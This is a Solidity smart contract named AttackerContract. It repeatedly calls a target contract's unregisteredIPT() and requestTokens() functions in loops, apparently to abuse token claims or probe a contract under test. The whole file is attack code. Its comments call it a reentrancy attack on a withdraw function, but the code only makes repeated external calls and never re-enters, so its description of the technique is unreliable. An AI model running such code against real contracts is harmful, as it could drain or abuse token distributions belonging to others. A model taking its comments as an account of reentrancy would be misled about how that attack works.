// AttackerContract.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerContract {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function setTargetContract(address _targetContract) external {
        targetContract = _targetContract;
    }

    // Function to perform a reentrancy attack
    function attackUnregisteredIPT() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract
            (bool successEth, ) = targetContract.call(abi.encodeWithSignature("unregisteredIPT()"));
          
            require(successEth, "Reentrancy attack failed IPT");

        }
    }

       // Function to perform a reentrancy attack
    function attackRequestTokens() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract

            (bool successEthUser, ) = targetContract.call(abi.encodeWithSignature("requestTokens()"));

            require(successEthUser, "Reentrancy attack failed for IPT request");
        }
    }


    // Function to receive Ether
    receive() external payable {}
}